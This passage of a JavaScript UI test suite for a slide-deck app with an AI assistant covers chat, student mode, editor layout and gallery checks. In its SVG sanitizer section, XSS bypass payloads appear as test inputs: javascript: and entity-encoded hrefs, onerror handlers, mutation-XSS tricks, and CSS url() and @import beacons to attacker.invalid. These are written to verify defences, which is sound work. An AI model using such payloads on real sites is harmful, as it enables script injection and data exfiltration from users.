  await _waitFor(() => !(document.body.textContent || "").includes("working..."), timeout);
  await _wait(300);
  return true;
};

uiSuite("Vera AI", [
  { name: "Simple chat reply", requiresAI: true, fn: async () => {
    await _veraChat("Reply with exactly one word: TESTPASS");
    await _waitFor(() => (document.body.textContent || "").includes("TESTPASS"), 30000);
  }},
  { name: "deck_stats tool call", requiresAI: true, fn: async () => {
    await _veraChat("Use the deck_stats tool. Start your answer with STATS:");
    await _waitFor(() => {
      const body = document.body.textContent || "";
      return body.includes("STATS:") || body.includes("deck_stats");
    }, 45000);
  }},
  { name: "Edit current slide via chat", requiresAI: true, fn: async () => {
    await _veraChat("Use edit_slide to change the heading on the current slide to 'UI Test Heading'. Keep everything else.");
    await _waitFor(() => (document.body.textContent || "").includes("UI Test Heading"), 45000);
    // Undo
    document.activeElement?.blur(); await _wait(100);
    _key("z", { ctrlKey: true }); await _wait(300);
  }},
  { name: "Add a new slide via chat", requiresAI: true, fn: async () => {
    await _veraChat("Add a single slide to the current module with heading 'Test Slide Alpha' and a text block saying 'Created by UI test suite'. Use add_slide.");
    await _waitFor(() => (document.body.textContent || "").includes("Test Slide Alpha"), 45000);
    // Undo
    document.activeElement?.blur(); await _wait(100);
    _key("z", { ctrlKey: true }); await _wait(300);
  }},
  { name: "Improve current slide via chat", requiresAI: true, fn: async () => {
    // Go to a content-rich slide first
    document.activeElement?.blur(); await _wait(50);
    for (let i = 0; i < 3; i++) { _key("ArrowRight"); await _wait(100); }
    await _veraChat("Improve this slide. Make the heading more impactful. Start your reply with IMPROVED:");
    await _waitFor(() => (document.body.textContent || "").includes("IMPROVED:"), 45000);
    // Undo
    document.activeElement?.blur(); await _wait(100);
    _key("z", { ctrlKey: true }); await _wait(300);
  }},
  // Chat stays open — all test messages visible for audit
]);

// ── v10: Student Mode Suite ─────────────────────────────────────────
uiSuite("Student Mode", [
  { name: "Enter fullscreen for student tests", fn: async () => {
    document.activeElement?.blur(); await _wait(200);
    // Close chat if left open by Vera AI tests
    const chatClose = _$$("button").find(b => b.textContent?.includes("Vera") && b.closest("header"));
    if (chatClose && document.body.textContent?.includes("working...") === false) {
      // Check if chat panel is visible
      const chatPanel = _$$("textarea").find(t => t.placeholder?.toLowerCase()?.includes("tell vera"));
      if (chatPanel) { _click(chatClose); await _wait(300); }
    }
    document.activeElement?.blur(); await _wait(100);
    // Ensure a module is selected (undo may have deselected)
    const hasSlide = _$$("div").find(d => d.style?.aspectRatio === "16 / 9" || d.style?.aspectRatio === "16/9");
    if (!hasSlide) {
      // Click first module in the list
      const firstMod = _$$("span").find(s => s.style?.fontWeight >= 600 && s.style?.fontSize === "12px" && s.style?.overflow === "hidden");
      if (firstMod) { _click(firstMod); await _wait(300); }
    }
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"), 3000);
  }},
  { name: "🎓 toggle button visible", fn: async () => {
    await _waitFor(() => _$("[data-testid='student-toggle']"), 2000);
  }},
  { name: "Activate student mode", fn: async () => {
    const btn = _$("[data-testid='student-toggle']");
    if (!btn) throw new Error("student-toggle not found");
    _click(btn);
    await _waitFor(() => _$("[data-teacher-panel]"), 5000);
  }},
  { name: "Teacher panel renders VERA header", fn: async () => {
    const panel = _$("[data-teacher-panel]");
    return !!panel && (panel.textContent || "").includes("VERA");
  }},
  { name: "Auto-generates notes (streaming)", fn: async () => {
    // API-dependent: check panel has streaming or content within timeout
    try {
      await _waitFor(() => {
        const panel = _$("[data-teacher-panel]");
        if (!panel) return false;
        return panel.textContent?.length > 80;
      }, 30000);
    } catch {
      // Soft fail — API may be slow, but panel should still exist
      const panel = _$("[data-teacher-panel]");
      if (!panel) throw new Error("Teacher panel not found");
      // Panel exists but content didn't load — pass with warning
    }
  }},
  { name: "AI disclaimer visible", fn: async () => {
    const panel = _$("[data-teacher-panel]");
    return !!panel && (panel.textContent || "").includes("AI answers");
  }},
  { name: "Input field present", fn: async () => {
    const panel = _$("[data-teacher-panel]");
    const input = panel?.querySelector("input");
    return !!input && input.placeholder?.includes("Ask");
  }},
  { name: "Ask button present", fn: async () => {
    const panel = _$("[data-teacher-panel]");
    return !!panel && (panel.textContent || "").includes("Ask");
  }},
  { name: "Follow-up questions appear", requiresAI: true, fn: async () => {
    // API-dependent: the "EXPLORE FURTHER" follow-ups only exist once the model
    // has answered, so this is a real check only with AI available. Without it
    // the wait would burn its full timeout and pass vacuously — skip instead.
    await _waitFor(() => _$text("EXPLORE FURTHER"), 30000);
  }},
  { name: "Wheel scroll stays in panel", fn: async () => {
    const panel = _$("[data-teacher-panel]");
    return !!panel && panel.hasAttribute("data-teacher-panel");
  }},
  { name: "Navigate slide keeps student mode", fn: async () => {
    // Ensure student mode is active
    if (!_$("[data-teacher-panel]")) {
      const btn = _$("[data-testid='student-toggle']");
      if (btn) _click(btn);
      await _waitFor(() => _$("[data-teacher-panel]"), 1500).catch(() => {});
    }
    document.activeElement?.blur(); await _wait(100);
    // Confirm the deck actually navigates, THEN assert the panel survived the change.
    const beforePos = _slidePos();
    _key("ArrowRight");
    await _waitFor(() => _slidePos() !== beforePos, 1200).catch(() => {});
    const panel = _$("[data-teacher-panel]");
    return !!panel;
  }},
  { name: "Previous slide has cached notes", requiresAI: true, fn: async () => {
    // Verifies AI-generated notes are cached per slide — only meaningful with
    // AI available; headless there is nothing to cache, so skip rather than
    // wait out the cache window and pass on the panel-shell text.
    await _wait(3000);
    _key("ArrowLeft"); await _wait(500);
    const panel = _$("[data-teacher-panel]");
    return panel && panel.textContent?.length > 50;
  }},
  { name: "Clear button resets current slide", fn: async () => {
    const clearBtn = _$$("button").find(b => b.textContent?.trim() === "⟳" && b.closest("[data-teacher-panel]"));
    if (clearBtn) _click(clearBtn);
    await _wait(300);
  }},
  { name: "Editing FABs hidden in student mode", fn: async () => {
    return !_$text("QUICK EDIT") && !_$text("NEW SLIDE");
  }},
  { name: "Exit student mode", fn: async () => {
    const btn = _$("[data-testid='student-toggle']");
    if (btn) _click(btn);
    await _waitFor(() => !_$("[data-teacher-panel]"), 5000);
  }},
  { name: "Exit fullscreen after student tests", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"), 3000);
  }},
]);

// ── v12.32: Offline Study Notes Suite ───────────────────────────────
// Uses the test-only affordance window.__velaTestInjectStudyNotes to
// patch the current slide with a pre-authored studyNotes object, then
// exercises the offline StaticStudyPanel rendering (text + glossary
// X-Ray links + questions + diagram). Does not depend on a live API.
uiSuite("Study Notes", [
  { name: "Test hook __velaTestInjectStudyNotes available", fn: async () => {
    if (typeof window.__velaTestInjectStudyNotes !== "function") throw new Error("window.__velaTestInjectStudyNotes not exposed");
  }},
  { name: "Inject studyNotes into current slide", fn: async () => {
    const sn = {
      text: "An **agent** is a goal-driven loop. See [ReAct](https://arxiv.org/abs/2210.03629) or [what an agent is](#agent).",
      diagram: "<svg viewBox='0 0 10 10' xmlns='http://www.w3.org/2000/svg'><rect x='1' y='1' width='8' height='8' fill='#3b82f6'/></svg>",
      questions: ["Why does this matter?", "When does it fail?"],
      glossary: { agent: { definition: "A goal-driven loop that plans, acts, observes.", url: "https://example.com/a" } }
    };
    const ok = window.__velaTestInjectStudyNotes(sn);
    if (!ok) throw new Error("inject returned false — no current slide");
    await _wait(150);
  }},
  { name: "🎓 study marker appears on slide viewer", fn: async () => {
    await _waitFor(() => _$("[data-study-marker]"), 2000);
  }},
  { name: "Enter fullscreen for study-panel tests", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"), 3000);
  }},
  { name: "Activate student mode on studyNotes slide", fn: async () => {
    const btn = _$("[data-testid='student-toggle']");
    if (!btn) throw new Error("student-toggle not found");
    _click(btn);
    await _waitFor(() => _$("[data-study-panel]"), 3000);
  }},
  { name: "Panel renders STUDY NOTES header (not VERA)", fn: async () => {
    const panel = _$("[data-study-panel]");
    if (!panel) throw new Error("data-study-panel not found");
    const txt = panel.textContent || "";
    return txt.includes("STUDY NOTES");
  }},
  { name: "Authored text renders immediately (no spinner)", fn: async () => {
    const body = _$("[data-study-notes-text]");
    return !!body && (body.textContent || "").includes("goal-driven loop");
  }},
  { name: "Inline external link rendered as <a>", fn: async () => {
    const body = _$("[data-study-notes-text]");
    if (!body) return false;
    const a = body.querySelector("a[href*='arxiv.org']");
    return !!a;
  }},
  { name: "Glossary X-Ray link has dashed underline", fn: async () => {
    const body = _$("[data-study-notes-text]");
    if (!body) return false;
    const span = body.querySelector("[data-xray-term='agent']");
    if (!span) return false;
    const style = span.getAttribute("style") || "";
    return style.includes("dashed");
  }},
  { name: "Click X-Ray term opens glossary popover with definition", fn: async () => {
    const span = _$("[data-xray-term='agent']");
    if (!span) throw new Error("X-Ray term span not found");
    _click(span);
    await _wait(100);
    const panel = _$("[data-study-panel]");
    return !!panel && (panel.textContent || "").includes("goal-driven loop");
  }},
  { name: "SVG diagram renders inside panel", fn: async () => {
    const dia = _$("[data-study-notes-diagram]");
    return !!dia && !!dia.querySelector("svg");
  }},
  { name: "Authored questions render", fn: async () => {
    const qs = _$("[data-study-notes-questions]");
    return !!qs && (qs.textContent || "").includes("Why does this matter?");
  }},
  { name: "Exit student mode", fn: async () => {
    const btn = _$("[data-testid='student-toggle']");
    if (btn) _click(btn);
    await _waitFor(() => !_$("[data-study-panel]"), 3000);
  }},
  { name: "Exit fullscreen after study-notes tests", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"), 3000);
  }},
  { name: "Clean up injected studyNotes", fn: async () => {
    // Undo the UPDATE_SLIDE so we don't leak state into later tests
    window.__velaTestInjectStudyNotes(undefined);
    await _wait(100);
  }},
]);

// ── Editor UX regressions (CR1 selection · CR2 alignment · CR3 layout) ──
// Asserts against the real rendered editor DOM:
//   CR1 — a slide is selected/visible on load (never a blank editor).
//   CR2 — a centered heading renders centered in the editor (icon-slot path),
//         matching presenter alignment; a left icon does not left-align it.
//   CR3 — the slide viewport is a fixed 16:9 box and the slide toolbar keeps
//         the same on-screen position across slides of differing content.
uiSuite("Editor UX (CR1–CR3)", [
  { name: "CR1: a slide is selected & visible on load (not blank)", fn: async () => {
    // The viewport marker only renders when a module/slide is selected.
    await _waitFor(() => _$("[data-testid='slide-viewport']"), 3000);
  }},
  { name: "CR3: slide viewport renders at fixed 16:9", fn: async () => {
    const vp = await _waitFor(() => _$("[data-testid='slide-viewport']"), 3000);
    const r = vp.getBoundingClientRect();
    if (r.width < 40 || r.height < 20) throw new Error(`viewport too small: ${r.width}x${r.height}`);
    const ratio = r.width / r.height;
    if (Math.abs(ratio - 16 / 9) > 0.05) throw new Error(`viewport not 16:9 — ratio=${ratio.toFixed(3)} (${Math.round(r.width)}x${Math.round(r.height)})`);
  }},
  { name: "CR3: toolbar position stable + viewport size fixed across differing content", fn: async () => {
    if (typeof window.__velaTestInjectBlocks !== "function") throw new Error("__velaTestInjectBlocks not exposed");
    if (!_$("[data-testid='slide-toolbar']")) throw new Error("slide-toolbar not found");
    // Light slide, no notes.
    window.__velaTestInjectBlocks([{ type: "heading", text: "LIGHT" }], { notes: "" });
    await _wait(180);
    const tb1 = _$("[data-testid='slide-toolbar']").getBoundingClientRect();
    const vp1 = _$("[data-testid='slide-viewport']").getBoundingClientRect();
    // Heavy slide with lots of content AND speaker notes — the pre-fix notes
    // auto-expand + elastic viewport would shove the toolbar upward here.
    window.__velaTestInjectBlocks([
      { type: "heading", text: "HEAVY CONTENT SLIDE" },
      { type: "bullets", items: ["one", "two", "three", "four", "five", "six", "seven", "eight"] },
      { type: "text", text: "A long paragraph ".repeat(20) },
    ], { notes: "Speaker notes line 1\nline 2\nline 3\nline 4\nline 5\nline 6" });
    await _wait(180);
    const tb2 = _$("[data-testid='slide-toolbar']").getBoundingClientRect();
    const vp2 = _$("[data-testid='slide-viewport']").getBoundingClientRect();
    if (Math.abs(tb1.top - tb2.top) > 1.5) throw new Error(`toolbar moved with content/notes: ${tb1.top.toFixed(1)} -> ${tb2.top.toFixed(1)}`);
    if (Math.abs(vp1.height - vp2.height) > 1.5) throw new Error(`viewport height changed with content: ${vp1.height.toFixed(1)} -> ${vp2.height.toFixed(1)}`);
    // Restore a benign single heading.
    window.__velaTestInjectBlocks([{ type: "heading", text: "" }], { notes: "" });
    await _wait(80);
  }},
  { name: "CR2: centered heading renders centered in editor (icon-slot path)", fn: async () => {
    if (typeof window.__velaTestInjectBlocks !== "function") throw new Error("__velaTestInjectBlocks not exposed");
    // Inject a centered heading (NO icon → the editor still forces its icon-slot
    // flex row, which is exactly the path that used to drop centering).
    const okc = window.__velaTestInjectBlocks([{ type: "heading", text: "CENTERED TITLE UITEST", size: "2xl", align: "center" }]);
    if (!okc) throw new Error("inject returned false — no current slide");
    await _wait(200);
    // Leaf element that actually holds the text node.
    const leaf = await _waitFor(() => {
      const cand = _$$("[data-testid='slide-viewport'] *").find((d) => d.children.length === 0 && (d.textContent || "").trim() === "CENTERED TITLE UITEST");
      return cand || null;
    }, 3000);
    // 1) Computed alignment on the text box must be centered (the fix sets
    //    textAlign:center on the flex:1 child; the bug left it inheriting left).
    const ta = getComputedStyle(leaf).textAlign;
    if (ta !== "center") throw new Error(`heading textAlign=${ta} (expected center)`);
    // 2) Geometric confirmation via a Range over the glyphs — the text ink box
    //    must sit roughly centered within its container, not hugging the left.
    const range = document.createRange();
    range.selectNodeContents(leaf);
    const gr = range.getBoundingClientRect();
    const cr = leaf.getBoundingClientRect();
    const leftGap = gr.left - cr.left;
    const rightGap = cr.right - gr.right;
    if (gr.width > 4 && cr.width - gr.width > 20) {
      // Only meaningful when the container is wider than the glyphs.
      if (leftGap < 8) throw new Error(`glyphs hug left edge (leftGap=${leftGap.toFixed(1)}) — not centered`);
      if (Math.abs(leftGap - rightGap) > cr.width * 0.2) throw new Error(`glyphs not centered — leftGap=${leftGap.toFixed(1)} rightGap=${rightGap.toFixed(1)}`);
    }
  }},
  { name: "CR2: cleanup injected blocks", fn: async () => {
    // Best-effort: restore by selecting first module again (reload path).
    // Injected block persists only in state; leaving it is harmless for later
    // suites, but we blank it to a minimal heading to reduce noise.
    try { window.__velaTestInjectBlocks([{ type: "heading", text: "" }]); } catch {}
    await _wait(80);
  }},
], { setup: _selectFirstModule });

// ── Security: SVG sanitizer bypass regression (v12.44) ───────────────
// The svg block previously used a regex chain that let unquoted and
// whitespace-obfuscated javascript: URIs through. These assert the
// DOM-based sanitizeSvgMarkup() neutralizes the known bypasses.
uiSuite("SVG Sanitizer (XSS)", [
  { name: "Benign svg survives sanitization", fn: async () => {
    const out = sanitizeSvgMarkup("<rect x='1' y='1' width='8' height='8' fill='#3b82f6'/>");
    return out.includes("<rect") && out.includes("#3b82f6");
  }},
  { name: "Unquoted javascript: href stripped (or whole svg rejected)", fn: async () => {
    const out = sanitizeSvgMarkup('<a href=javascript:alert(1)><text>x</text></a>');
    return !/javascript:/i.test(out);
  }},
  { name: "Quoted javascript: href stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<a href="javascript:alert(1)"><text>x</text></a>');
    return !/javascript:/i.test(out) && !/href\s*=/i.test(out.replace(/data-blocked-href/gi, ""));
  }},
  { name: "Whitespace-obfuscated scheme neutralized", fn: async () => {
    const out = sanitizeSvgMarkup('<a href="java\tscript:alert(1)"><text>x</text></a>');
    // either attr removed, or whitespace normalized so it is no longer a javascript scheme
    return !/javascript:/i.test(out.replace(/\s+/g, ""));
  }},
  { name: "xlink:href javascript: stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<a xlink:href="javascript:alert(1)"><text>x</text></a>');
    return !/javascript:/i.test(out);
  }},
  { name: "data: URI in href stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<image href="data:text/html,<script>alert(1)</script>" />');
    return !/data:/i.test(out);
  }},
  { name: "Event handler attribute stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<rect width="10" height="10" onload="alert(1)" />');
    return !/\bon\w+\s*=/i.test(out);
  }},
  { name: "script element stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<g><script>alert(1)</script></g>');
    return !/<script/i.test(out);
  }},
  { name: "foreignObject element stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<foreignObject><img src=x onerror=alert(1)></foreignObject>');
    return !/<foreignobject/i.test(out) && !/onerror/i.test(out);
  }},
  // CSS-text exfil: <style>/<link> inside SVG fire an outbound GET via url() /
  // @import / rel=stylesheet with no CSP backstop. We filter <style> textContent
  // (preserve legitimate class-based styling and url(#fragment) refs that
  // Mermaid/Vera diagrams need), and block <link> outright.
  { name: "SVG <style> with external url() removed (exfil blocked)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>* { background: url("https://attacker.invalid/?d=x") }</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> @import removed (exfil blocked)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>@import url("https://attacker.invalid/x.css");</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/@import/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> with CSS \\XX escape removed (escape-bypass blocked)", fn: async () => {
    // \75rl(...) decodes to url(...) in the CSS parser — escape-token bypass
    const out = sanitizeSvgMarkup('<style>* { background: \\75rl("https://attacker.invalid/") }</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> with safe class CSS preserved (Mermaid/Vera compat)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>.node{fill:#3b82f6;stroke:#888}.edge{stroke-width:2}</style><rect class="node"/>');
    return /<style/i.test(out) && /#3b82f6/.test(out) && /\.node/.test(out);
  }},
  { name: "SVG <style> with url(#fragment) preserved (paint-server refs)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>.arrow{fill:url(#grad1);marker-end:url(#mark)}</style><rect class="arrow"/>');
    return /<style/i.test(out) && /url\(#grad1\)/.test(out) && /url\(#mark\)/.test(out);
  }},
  // v12.59 — string-source CSS image functions (no url() token) auto-fetch on
  // render. image-set/image/cross-fade/src were the residual bypass of the
  // v12.53 url()-only filter. Vela decks load NOTHING external.
  { name: "SVG <style> image-set() string source removed (beacon blocked)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>[x^="V"]{background:image-set("https://attacker.invalid/b?p=V" 1x)}</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> -webkit-image-set / cross-fade / src() removed", fn: async () => {
    const out = sanitizeSvgMarkup('<style>a{background:-webkit-image-set("https://attacker.invalid/x" 1x)}b{x:cross-fade(url(#a),"https://attacker.invalid/y",50%)}c{x:src("https://attacker.invalid/z")}</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG fill='url(https://…)' presentation attr removed", fn: async () => {
    const out = sanitizeSvgMarkup('<rect fill="url(https://attacker.invalid/b)" filter="url(https://attacker.invalid/f)"/>');
    return !/attacker\.invalid/i.test(out);
  }},
  { name: "SVG external <image href> beacon removed (#fragment only)", fn: async () => {
    const out = sanitizeSvgMarkup('<image href="https://attacker.invalid/b.png"/>');
    return !/attacker\.invalid/i.test(out);
  }},
  { name: "SVG <feImage href> external removed (Roundcube class)", fn: async () => {
    const out = sanitizeSvgMarkup('<filter><feImage href="https://attacker.invalid/b.png"/><feImage xlink:href="https://attacker.invalid/c.png"/></filter>');
    return !/attacker\.invalid/i.test(out);
  }},
  { name: "SVG #fragment paint refs + <a> https click-link preserved (v12.59)", fn: async () => {
    const refs = sanitizeSvgMarkup('<rect fill="url(#grad)" clip-path="url(#c)"/>');
    const link = sanitizeSvgMarkup('<a href="https://example.com/x"><text>hi</text></a>');
    return /url\(#grad\)/.test(refs) && /url\(#c\)/.test(refs) && /href="https:\/\/example\.com\/x"/.test(link);
  }},
  { name: "SVG <link rel=stylesheet> stripped outright", fn: async () => {
    const out = sanitizeSvgMarkup('<link rel="stylesheet" href="https://attacker.invalid/x.css"/><rect/>');
    return !/<link/i.test(out) && !/attacker\.invalid/i.test(out);
  }},
  // Mutation-XSS round-trip: sanitize, then re-parse as HTML exactly like
  // dangerouslySetInnerHTML does, and assert no live event handler materializes.
  { name: "CDATA-in-style mXSS round-trip neutralized", fn: async () => {
    const out = sanitizeSvgMarkup("<style><![CDATA[</style><img src=x onerror=alert(1)>]]" + "></style>");
    const d = document.createElement("div"); d.innerHTML = out;
    return !_$$("*", d).some((el) => Array.from(el.attributes || []).some((a) => /^on/i.test(a.name)));
  }},
  { name: "CDATA-in-text mXSS round-trip neutralized", fn: async () => {
    const out = sanitizeSvgMarkup("<text><![CDATA[</text><img src=x onerror=alert(1)>]]" + "></text>");
    const d = document.createElement("div"); d.innerHTML = out;
    return !_$$("*", d).some((el) => Array.from(el.attributes || []).some((a) => /^on/i.test(a.name)));
  }},
  { name: "Comment-node smuggling neutralized", fn: async () => {
    const out = sanitizeSvgMarkup("<!--<img src=x onerror=alert(1)>-->");
    const d = document.createElement("div"); d.innerHTML = out;
    return !d.querySelector("img") && !/onerror/i.test(out);
  }},
  { name: "sanitizeUrl blocks javascript:/data:/vbscript:", fn: async () => {
    return sanitizeUrl("javascript:alert(1)") === "" &&
           sanitizeUrl("data:text/html,<script>alert(1)</script>") === "" &&
           sanitizeUrl("vbscript:msgbox(1)") === "" &&
           sanitizeUrl("https://example.com/x") === "https://example.com/x";
  }},
  { name: "sanitizeUrl rejects UNC/backslash/protocol-relative refs (parse-vs-emit)", fn: async () => {
    // A schemeless authority ref parses as http(s) (passing the allowlist) but
    // must not survive raw into an export hyperlink target — it is rejected, not
    // emitted verbatim. http(s) links come back in canonical form.
    return sanitizeUrl("\\\\host\\share\\x") === "" &&
           sanitizeUrl("//host.example/x") === "" &&
           sanitizeUrl("/\\host/x") === "" &&
           sanitizeUrl("http:\\\\host\\x") === "" &&
           sanitizeUrl("https:/host.example") === "" &&
           sanitizeUrl("https://host.example/a") === "https://host.example/a" &&
           sanitizeUrl("data:image/png;base64,AAAA", ["data:"]) === "data:image/png;base64,AAAA";
  }},
  { name: "item-level links sanitized by sanitizeBlock", fn: async () => {
    const ir = sanitizeBlock({ type: "icon-row", items: [{ text: "x", link: "javascript:alert(1)" }] });
    const fl = sanitizeBlock({ type: "flow", items: [{ label: "n", link: "javascript:alert(1)" }] });
    return !ir.items[0].link && !fl.items[0].link;
  }},
  { name: "SMIL animate/animateTransform/animateMotion stripped", fn: async () => {
    const a = sanitizeSvgMarkup('<a><animate attributeName="href" to="javascript:alert(1)" begin="0s"/><text>x</text></a>');
    const t = sanitizeSvgMarkup('<rect><animateTransform attributeName="transform" type="rotate" onbegin="alert(1)"/></rect>');
    const mo = sanitizeSvgMarkup('<rect><animateMotion onbegin="alert(1)" dur="1s"/></rect>');
    return !/<animate/i.test(a) && !/<animatetransform/i.test(t) && !/<animatemotion/i.test(mo) && !/onbegin/i.test(t + mo);
  }},
  // Entity-encoded scheme: parser decodes &#58;/&#x3a;/&#115; before the scheme check runs
  { name: "Entity-encoded javascript: scheme stripped (dec/hex/letter)", fn: async () => {
    const hasJsAnchor = (mk) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
      return _$$("a", d).some((a) => /^\s*javascript:/i.test((a.getAttribute("href") || "").replace(/\s/g, ""))); };
    return !hasJsAnchor('<a href="javascript&#58;alert(1)"><text>x</text></a>') &&
           !hasJsAnchor('<a href="javascript&#x3a;alert(1)"><text>x</text></a>') &&
           !hasJsAnchor('<a href="java&#115;cript:alert(1)"><text>x</text></a>');
  }},
  // Regex-class bypasses: tag reconstruction + unclosed/incomplete tags → fail-closed empty output
  { name: "Tag-reconstruction <scr<script>..ipt> neutralized", fn: async () => {
    const out = sanitizeSvgMarkup("<scr<script></script>ipt>alert(1)</scr<script></script>ipt>");
    const d = document.createElement("div"); d.innerHTML = out;
    return !/<script/i.test(out) && !d.querySelector("script");
  }},
  // sanitizeString: single-pass /<[^>]*>/ is incomplete (an unclosed "<script" has
  // no ">" to match, and reconstruction can rejoin fragments). Fixpoint loop +
  // residual "<" strip must leave no live tag opener, while bare "<" math survives.
  { name: "sanitizeString neutralizes unclosed/reconstructed tags", fn: async () => {
    const bad = ["<script", "<scr<script>ipt>alert(1)", "<img src=x onerror=alert(1)", "<<script>>alert"];
    const clean = bad.every((s) => { const o = sanitizeString(s); return !/<script/i.test(o) && !/<[a-z!/]/i.test(o); });
    return clean && sanitizeString("a < b") === "a < b";
  }},
  { name: "Unclosed iframe/embed/script/foreignObject neutralized", fn: async () => {
    const danger = (mk) => { const out = sanitizeSvgMarkup(mk); const d = document.createElement("div"); d.innerHTML = out;
      return !!d.querySelector("iframe,embed,script,foreignObject") ||
             _$$("*", d).some((el) => Array.from(el.attributes || []).some((a) => /^on/i.test(a.name))); };
    return !danger('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">') &&
           !danger('<embed src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">') &&
           !danger("<script>alert(1)") &&
           !danger("<foreignObject><img src=x onerror=alert(1)>");
  }},
  { name: "vbscript: via xlink:href stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="vbscript:msgbox(1)"><text>x</text></a></svg>');
    return !/vbscript:/i.test(out);
  }},
  // Mixed-case schemes — DOMParser preserves case in attribute values; the sanitizer
  // must fold case before scheme comparison.
  { name: "Mixed-case javascript:/data:/vbscript: schemes stripped", fn: async () => {
    const hasJsAnchor = (mk) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
      return _$$("a,image", d).some((el) => {
        const v = (el.getAttribute("href") || el.getAttribute("xlink:href") || "").replace(/[\u0000-\u0020]/g, "").toLowerCase();
        return v.startsWith("javascript:") || v.startsWith("data:") || v.startsWith("vbscript:"); }); };
    return !hasJsAnchor('<a href="JaVaScRiPt:alert(1)"><text>x</text></a>') &&
           !hasJsAnchor('<a href="JAVASCRIPT:alert(1)"><text>x</text></a>') &&
           !hasJsAnchor('<a href="Data:text/html,<script>alert(1)</script>"><text>x</text></a>') &&
           !hasJsAnchor('<a xlink:href="VbScript:msgbox(1)"><text>x</text></a>');
  }},
  // Allowlist enforcement — unexpected protocols (file:, blob:, chrome:, intent:) must be
  // stripped after browser normalization, not just the historic js:/data:/vbscript: trio.
  { name: "Unexpected protocols (file:/blob:/chrome:/intent:) stripped from href", fn: async () => {
    const has = (mk, scheme) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
      return _$$("a", d).some((el) => (el.getAttribute("href") || "").toLowerCase().startsWith(scheme)); };
    return !has('<a href="file:///etc/passwd"><text>x</text></a>', "file:") &&
           !has('<a href="blob:https://x/abc"><text>x</text></a>', "blob:") &&
           !has('<a href="chrome://settings"><text>x</text></a>', "chrome:") &&
           !has('<a href="intent://x"><text>x</text></a>', "intent:");
  }},
  // Allowlisted schemes + fragment + relative must SURVIVE the allowlist (regression guard).
  { name: "Allowlisted href schemes preserved (http/https/mailto/tel/#frag/relative)", fn: async () => {
    const keptHref = (mk) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
      const a = d.querySelector("a"); return a && a.getAttribute("href"); };
    return !!keptHref('<a href="https://example.com/x"><text>x</text></a>') &&
           !!keptHref('<a href="http://example.com/x"><text>x</text></a>') &&
           !!keptHref('<a href="mailto:a@b.c"><text>x</text></a>') &&
           !!keptHref('<a href="tel:+15551234"><text>x</text></a>') &&
           !!keptHref('<a href="#anchor"><text>x</text></a>') &&
           !!keptHref('<a href="path/to/x.svg"><text>x</text></a>');
  }},
]);

// ── Security: deck-level sanitization (fail-closed + clamp + IMPORT_CONCEPTS) ──
uiSuite("Deck Sanitization (XSS)", [
  { name: ">50 lanes clamps to 50 without throwing (no fail-open trigger)", fn: async () => {
    const lanes = []; for (let i = 0; i < 60; i++) lanes.push({ title: "L" + i, items: [] });
    let threw = false, res = null;
    try { res = validateAndSanitizeDeck({ deckTitle: "x", lanes }); } catch (e) { threw = true; }
    return !threw && res && res.lanes.length === 50;
  }},
  { name: "Large deck still sanitizes item-level javascript: link", fn: async () => {
    const lanes = [{ title: "L0", items: [{ title: "m", slides: [{ blocks: [
      { type: "icon-row", items: [{ text: "Click", link: "javascript:alert(1)" }] }] }] }] }];
    for (let i = 1; i < 60; i++) lanes.push({ title: "L" + i, items: [] });
    const res = validateAndSanitizeDeck({ deckTitle: "x", lanes });
    const ir = res.lanes[0].items[0].slides[0].blocks.find((b) => b.type === "icon-row");
    return !!ir && !ir.items[0].link;
  }},
  { name: "Non-whitelisted block type dropped by sanitizeBlock", fn: async () => {
    return sanitizeBlock({ type: "NOT_A_BLOCK", evil: true }) === null;
  }},
]);

// ── v10: Gallery View Suite ──────────────────────────────────────────
uiSuite("Gallery View", [
  { name: "Enter fullscreen for gallery tests", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"));
  }},
  { name: "🗂 gallery button visible", fn: async () => {
    await _waitFor(() => _$("[data-testid='gallery-toggle']"), 2000);
  }},
  { name: "G key opens gallery", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("g");
    await _waitFor(() => _$text("GALLERY"), 2000);
  }},
  { name: "Gallery shows slide count", fn: async () => {
    await _waitFor(() => {
      const el = _$text("slides");
      return el && /\d+\s*slides/.test(el.textContent);
    }, 2000);
  }},
  { name: "Gallery shows module grouping", fn: async () => {
    // Should have module labels (colored text above first slide of each module)
    // Look for any text matching a known module title in mono font
    await _waitFor(() => {
      const monos = _$$("span").filter(s => s.style?.fontFamily?.includes("mono") && s.style?.fontWeight >= 600 && s.style?.letterSpacing);
